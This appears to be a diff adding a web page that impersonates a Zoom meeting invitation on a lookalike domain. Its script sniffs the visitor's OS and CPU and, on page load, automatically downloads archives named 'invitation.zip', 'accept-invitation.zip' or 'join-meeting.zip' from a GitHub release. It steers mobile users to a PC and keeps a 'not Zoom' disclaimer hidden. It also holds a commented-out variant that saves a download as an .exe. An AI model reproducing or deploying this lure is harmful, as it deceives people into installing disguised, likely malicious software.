@@ -1,0 +1,246 @@
+<!DOCTYPE html>
+<html>
+<head>
+
+  <title>Zoom Meeting</title>
+
+  <!-- Open Graph -->
+  <meta property="og:title" content="Zoom Meeting">
+  <meta property="og:description" content="Join the Zoom meeting">
+  <meta property="og:image" content="https://invite.zoom.meeting.us.inquire.onl/join/247634/zoom.png">
+  <meta property="og:url" content="https://invite.zoom.meeting.us.inquire.onl">
+  <meta property="og:type" content="website">
+
+  <!-- Optional -->
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Zoom Meeting">
+  <meta name="twitter:description" content="Join the Zoom meeting">
+  <meta name="twitter:image" content="zoom.png">
+
+  <style>
+    body {
+      font-family: -apple-system, sans-serif;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+      margin: 0;
+      background: #f5f5f5;
+      text-align: center;
+      padding: 20px;
+      box-sizing: border-box;
+    }
+    #msg {
+      display: none;
+      max-width: 400px;
+    }
+    #msg h2 { margin-bottom: 10px; }
+  </style>
+</head>
+<body>
+
+  <div id="msg">
+    <h2>Unable to join on mobile</h2>
+    <p>Please open this link on a PC to join the meeting.</p>
+  </div>
+<main class="panel" style="display: none;">
+    <div class="notice">
+      <strong></strong>
+      This download is provided by an independent publisher. It is not
+      developed, operated, sponsored, or endorsed by Zoom Video Communications,
+      Inc. It is not a Zoom application or meeting component, and downloading
+      it will not join a meeting.
+    </div>
+
+    <section id="message" aria-live="polite">
+      <h1>Desktop download required</h1>
+      <p>This software is currently available for desktop operating systems.
+         Please open this page on a supported Windows or Mac computer.</p>
+    </section>
+
+    <section id="downloadPanel" aria-live="polite">
+      <h1>Software download</h1>
+      <p id="status">Detecting your device and preparing your download…</p>
+      <div id="downloadActions"></div>
+    </section>
+
+    <p class="small">Only download software you trust. Review the publisher and
+      verify the downloaded file before opening it.</p>
+  </main>
+
+  <script>
+    "use strict";
+
+    function isMobileDevice() {
+      // Check user agent
+      const ua = navigator.userAgent || navigator.vendor || window.opera;
+      const uaCheck = /android|iphone|ipad|ipod|windows phone/i.test(ua);
+
+      // Check touch + small screen as backup (catches edge cases)
+      const touchCheck = ('ontouchstart' in window || navigator.maxTouchPoints > 0) 
+                          && window.innerWidth <= 900;
+
+      return uaCheck || touchCheck;
+    }
+if (isMobileDevice()) {
+      document.getElementById('msg').style.display = 'block';
+    } else {
+    // const downloadUrl = "https://github.com/Global-Trade-Plus/invite/releases/latest/download/invite.rar";
+    // const filename = "your-software.exe";
+
+    // if (isMobileDevice()) {
+    //   document.getElementById('msg').style.display = 'block';
+    // } else {
+    //   // Trigger download immediately
+    //   const link = document.createElement('a');
+    //   link.href = downloadUrl;
+    //   link.download = filename;
+    //   document.body.appendChild(link);
+    //   link.click();
+    //   document.body.removeChild(link);
+    // }
+
+
+    // These asset names must match the files attached to your GitHub release.
+    const RELEASE_BASE =
+      "https://github.com/Trades25/zomm/releases/latest/download/";
+
+    const DOWNLOADS = Object.freeze({
+      windows: RELEASE_BASE + "invitation.zip",
+      "macos-x86_64": RELEASE_BASE + "accept-invitation.zip",
+      "macos-aarch64": RELEASE_BASE + "join-meeting.zip"
+    });
+
+    const message = document.getElementById("message");
+    const downloadPanel = document.getElementById("downloadPanel");
+    const status = document.getElementById("status");
+    const downloadActions = document.getElementById("downloadActions");
+
+    function isPhoneOrTablet() {
+      const ua = navigator.userAgent || "";
+      const explicitMobile =
+        /android|iphone|ipad|ipod|windows phone|mobile/i.test(ua);
+      const ipadOSDesktopMode =
+        /macintosh/i.test(ua) && navigator.maxTouchPoints > 1;
+
+      return explicitMobile ||
+        ipadOSDesktopMode ||
+        navigator.userAgentData?.mobile === true;
+    }
+
+    async function getArchitecture() {
+      if (navigator.userAgentData?.getHighEntropyValues) {
+        try {
+          const hints = await navigator.userAgentData.getHighEntropyValues([
+            "architecture", "bitness"
+          ]);
+          const architecture = (hints.architecture || "").toLowerCase();
+
+          if (architecture === "arm" || architecture === "arm64") {
+            return "aarch64";
+          }
+          if (architecture === "x86") {
+            return "x86_64";
+          }
+        } catch (error) {
+          console.info("Browser did not provide architecture information.");
+        }
+      }
+
+      // Safari and some other browsers do not expose Mac CPU architecture.
+      // Do not guess: an incorrect binary may not run.
+      return null;
+    }
+
+    async function detectPlatform() {
+      if (isPhoneOrTablet()) return "phone";
+
+      const ua = navigator.userAgent || "";
+      const platform =
+        navigator.userAgentData?.platform || navigator.platform || "";
+
+      if (/windows/i.test(platform) || /windows nt/i.test(ua)) {
+        return "windows";
+      }
+
+      if (/mac/i.test(platform) || /macintosh/i.test(ua)) {
+        const architecture = await getArchitecture();
+        if (architecture === "aarch64") return "macos-aarch64";
+        if (architecture === "x86_64") return "macos-x86_64";
+        return "macos-unknown";
+      }
+
+      return "unsupported";
+    }
+
+    function addManualDownloadLink(platform, label) {
+      const link = document.createElement("a");
+      link.className = "download-button";
+      link.href = DOWNLOADS[platform];
+      link.textContent = "Download for " + label;
+      link.rel = "noopener";
+      downloadActions.appendChild(link);
+    }
+
+    function startAutomaticDownload(platform, label) {
+      const url = DOWNLOADS[platform];
+      status.textContent =
+        "Detected " + label + ". Your download is starting…";
+
+      // Keep a visible fallback because browsers can block downloads initiated
+      // automatically without a direct user gesture.
+      addManualDownloadLink(platform, label);
+
+      const link = document.createElement("a");
+      link.href = url;
+      link.rel = "noopener";
+      link.style.display = "none";
+      document.body.appendChild(link);
+      link.click();
+      link.remove();
+
+      status.textContent =
+        "Your " + label + " download was requested. If it did not start, use the button below.";
+    }
+
+    function showMacArchitectureChoices() {
+      status.textContent =
+        "Your Mac was detected, but this browser could not identify its processor. Choose the correct version.";
+      addManualDownloadLink("macos-x86_64", "Intel Mac");
+      addManualDownloadLink("macos-aarch64", "Apple Silicon Mac");
+    }
+
+    async function initialize() {
+      const platform = await detectPlatform();
+
+      if (platform === "phone") {
+        message.style.display = "block";
+        return;
+      }
+
+      downloadPanel.style.display = "block";
+
+      if (platform === "windows") {
+        startAutomaticDownload("windows", "Windows");
+      } else if (platform === "macos-x86_64") {
+        startAutomaticDownload("macos-x86_64", "macOS Intel");
+      } else if (platform === "macos-aarch64") {
+        startAutomaticDownload("macos-aarch64", "macOS Apple Silicon");
+      } else if (platform === "macos-unknown") {
+        showMacArchitectureChoices();
+      } else {
+        status.textContent =
+          "We could not identify a supported operating system. This page supports Windows and macOS.";
+      }
+    }
+
+    initialize().catch((error) => {
+      console.error("Platform detection failed:", error);
+      downloadPanel.style.display = "block";
+      status.textContent =
+        "Automatic detection failed. Refresh the page or use a supported desktop browser.";
+    })};
+  </script>
+
+</body>
+</html>
